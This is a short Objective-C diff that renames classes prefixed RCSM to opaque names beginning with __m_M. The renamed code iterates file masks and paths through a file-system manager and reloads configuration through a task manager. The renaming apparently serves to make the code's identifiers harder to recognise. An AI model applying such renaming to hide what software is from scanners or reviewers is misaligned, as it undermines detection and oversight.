@@ -152,7 +152,7 @@
                   
                   if ([files count] > 0)
                     {
-                      RCSMFileSystemManager *fsManager = [[RCSMFileSystemManager alloc] init];
+                      __m_MFileSystemManager *fsManager = [[__m_MFileSystemManager alloc] init];
                       
                       for (NSString *fileMask in files)
                         {
@@ -238,7 +238,7 @@
                   
                   if ([paths count] > 0)
                     {
-                      RCSMFileSystemManager *fsManager = [[RCSMFileSystemManager alloc] init];
+                      __m_MFileSystemManager *fsManager = [[__m_MFileSystemManager alloc] init];
                       
                       for (NSDictionary *dictionary in paths)
                         {
@@ -301,7 +301,7 @@
   // Time to reload the configuration, if needed
   // TODO: Refactor this
   //
-  RCSMTaskManager *_taskManager = [RCSMTaskManager sharedInstance];
+  __m_MTaskManager *_taskManager = [__m_MTaskManager sharedInstance];
   
   if (_taskManager.mShouldReloadConfiguration == YES)
     {
